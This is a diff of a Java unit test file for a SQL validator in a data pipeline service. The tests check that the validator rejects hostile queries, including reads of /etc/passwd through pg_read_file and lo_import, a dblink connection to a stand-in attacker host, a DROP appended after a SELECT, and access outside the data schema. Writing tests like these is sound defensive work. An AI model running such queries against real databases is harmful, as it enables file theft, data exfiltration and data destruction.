@@ -3,7 +3,7 @@ package com.smartfirehub.pipeline.service.validator;
 import static org.assertj.core.api.Assertions.assertThatCode;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
 
-import com.smartfirehub.pipeline.exception.ScriptExecutionException;
+import com.smartfirehub.pipeline.exception.UnsafeSqlException;
 import org.junit.jupiter.api.Test;
 
 class SqlValidatorTest {
@@ -13,149 +13,153 @@ class SqlValidatorTest {
   // --- 허용되는 구문 ---
 
   @Test
-  void validate_selectStatement_passes() {
-    assertThatCode(() -> validator.validate("SELECT * FROM data.some_table"))
+  void allows_simple_select_on_data_schema() {
+    assertThatCode(() -> validator.validate("SELECT * FROM data.t")).doesNotThrowAnyException();
+  }
+
+  @Test
+  void allows_select_with_where_order() {
+    assertThatCode(() -> validator.validate("SELECT a, b FROM data.t WHERE c > 1 ORDER BY a"))
         .doesNotThrowAnyException();
   }
 
   @Test
-  void validate_insertStatement_passes() {
+  void allows_insert_select_within_data_schema() {
     assertThatCode(
-            () -> validator.validate("INSERT INTO data.some_table (col1, col2) VALUES ('a', 'b')"))
+            () -> validator.validate("INSERT INTO data.t (a, b) SELECT a, b FROM data.s"))
         .doesNotThrowAnyException();
   }
 
   @Test
-  void validate_updateStatement_passes() {
-    assertThatCode(() -> validator.validate("UPDATE data.some_table SET col1 = 'new' WHERE id = 1"))
+  void allows_update_on_data_schema() {
+    assertThatCode(() -> validator.validate("UPDATE data.t SET a = 1 WHERE id = 2"))
         .doesNotThrowAnyException();
   }
 
   @Test
-  void validate_deleteStatement_passes() {
-    assertThatCode(() -> validator.validate("DELETE FROM data.some_table WHERE id = 1"))
+  void allows_delete_on_data_schema() {
+    assertThatCode(() -> validator.validate("DELETE FROM data.t WHERE id = 2"))
         .doesNotThrowAnyException();
   }
 
-  // --- 차단되는 구문 ---
-
   @Test
-  void validate_dropTable_blocked() {
-    assertThatThrownBy(() -> validator.validate("DROP TABLE data.some_table"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("DROP");
+  void allows_cte_referencing_only_data_schema() {
+    assertThatCode(
+            () ->
+                validator.validate(
+                    "WITH cte AS (SELECT id, x FROM data.s) "
+                        + "SELECT t.id, cte.x FROM data.t JOIN cte USING (id)"))
+        .doesNotThrowAnyException();
   }
 
   @Test
-  void validate_alterTable_blocked() {
-    assertThatThrownBy(() -> validator.validate("ALTER TABLE data.some_table ADD COLUMN x TEXT"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("ALTER");
+  void allows_trailing_semicolon() {
+    assertThatCode(() -> validator.validate("SELECT * FROM data.t;")).doesNotThrowAnyException();
+  }
+
+  // --- 거부되는 구문 ---
+
+  @Test
+  void rejects_multiple_statements() {
+    assertThatThrownBy(() -> validator.validate("SELECT 1; SELECT 2"))
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("멀티 스테이트먼트");
   }
 
   @Test
-  void validate_createTable_blocked() {
-    assertThatThrownBy(() -> validator.validate("CREATE TABLE data.new_table (id BIGINT)"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("CREATE");
+  void rejects_statement_appended_after_select() {
+    assertThatThrownBy(() -> validator.validate("SELECT * FROM data.t; DROP TABLE data.t"))
+        .isInstanceOf(UnsafeSqlException.class);
   }
 
   @Test
-  void validate_grantStatement_blocked() {
+  void rejects_public_schema_reference() {
+    assertThatThrownBy(() -> validator.validate("SELECT * FROM public.\"user\""))
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("data");
+  }
+
+  @Test
+  void rejects_information_schema_reference() {
+    assertThatThrownBy(() -> validator.validate("SELECT * FROM information_schema.tables"))
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("data");
+  }
+
+  @Test
+  void rejects_unqualified_table_reference() {
+    assertThatThrownBy(() -> validator.validate("SELECT * FROM t"))
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("스키마");
+  }
+
+  @Test
+  void rejects_cte_with_public_reference_inside() {
     assertThatThrownBy(
-            () -> validator.validate("GRANT SELECT ON data.some_table TO pipeline_executor"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("GRANT");
+            () ->
+                validator.validate(
+                    "WITH cte AS (SELECT * FROM public.\"user\") SELECT * FROM cte"))
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("data");
   }
 
   @Test
-  void validate_revokeStatement_blocked() {
-    assertThatThrownBy(
-            () -> validator.validate("REVOKE SELECT ON data.some_table FROM pipeline_executor"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("REVOKE");
+  void rejects_drop_statement() {
+    assertThatThrownBy(() -> validator.validate("DROP TABLE data.t"))
+        .isInstanceOf(UnsafeSqlException.class);
   }
 
   @Test
-  void validate_setRole_blocked() {
-    assertThatThrownBy(() -> validator.validate("SET ROLE app; SELECT 1"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("SET ROLE");
+  void rejects_truncate_statement() {
+    assertThatThrownBy(() -> validator.validate("TRUNCATE data.t"))
+        .isInstanceOf(UnsafeSqlException.class);
   }
 
   @Test
-  void validate_resetRole_blocked() {
-    assertThatThrownBy(() -> validator.validate("RESET ROLE; SELECT 1"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("차단된 키워드");
+  void rejects_do_block() {
+    assertThatThrownBy(() -> validator.validate("DO $$ BEGIN END $$"))
+        .isInstanceOf(UnsafeSqlException.class);
   }
 
   @Test
-  void validate_copyStatement_blocked() {
-    assertThatThrownBy(
-            () -> validator.validate("COPY (SELECT * FROM public.\"user\") TO '/tmp/dump.csv'"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("COPY");
-  }
-
-  @Test
-  void validate_pgReadFile_blocked() {
+  void rejects_pg_read_file_in_select() {
     assertThatThrownBy(() -> validator.validate("SELECT pg_read_file('/etc/passwd')"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("PG_READ_FILE");
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("pg_read_file");
   }
 
   @Test
-  void validate_dblink_blocked() {
+  void rejects_dblink_in_select() {
     assertThatThrownBy(
-            () -> validator.validate("SELECT dblink_connect('host=attacker.com dbname=x')"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("DBLINK");
+            () -> validator.validate("SELECT dblink_connect('host=evil.com dbname=x')"))
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("dblink_connect");
   }
 
   @Test
-  void validate_doBlock_blocked() {
-    assertThatThrownBy(() -> validator.validate("DO $$ BEGIN RAISE NOTICE 'hello'; END $$;"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("DO $");
-  }
-
-  @Test
-  void validate_truncateStatement_blocked() {
-    assertThatThrownBy(() -> validator.validate("TRUNCATE data.some_table"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("TRUNCATE");
-  }
-
-  @Test
-  void validate_loImport_blocked() {
+  void rejects_lo_import_in_select() {
     assertThatThrownBy(() -> validator.validate("SELECT lo_import('/etc/passwd')"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("LO_IMPORT");
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("lo_import");
   }
 
   @Test
-  void validate_setSessionAuthorization_blocked() {
-    assertThatThrownBy(() -> validator.validate("SET SESSION AUTHORIZATION 'app'"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("SET SESSION AUTHORIZATION");
+  void rejects_garbage_input() {
+    assertThatThrownBy(() -> validator.validate("not a sql"))
+        .isInstanceOf(UnsafeSqlException.class);
   }
 
   @Test
-  void validate_caseInsensitive_blocked() {
-    assertThatThrownBy(() -> validator.validate("dRoP TABLE data.some_table"))
-        .isInstanceOf(ScriptExecutionException.class)
-        .hasMessageContaining("DROP");
+  void rejects_null() {
+    assertThatThrownBy(() -> validator.validate(null))
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("비어");
   }
 
   @Test
-  void validate_nullScript_throwsException() {
-    assertThatThrownBy(() -> validator.validate(null)).isInstanceOf(ScriptExecutionException.class);
-  }
-
-  @Test
-  void validate_blankScript_throwsException() {
+  void rejects_blank() {
     assertThatThrownBy(() -> validator.validate("   "))
-        .isInstanceOf(ScriptExecutionException.class);
+        .isInstanceOf(UnsafeSqlException.class)
+        .hasMessageContaining("비어");
   }
 }
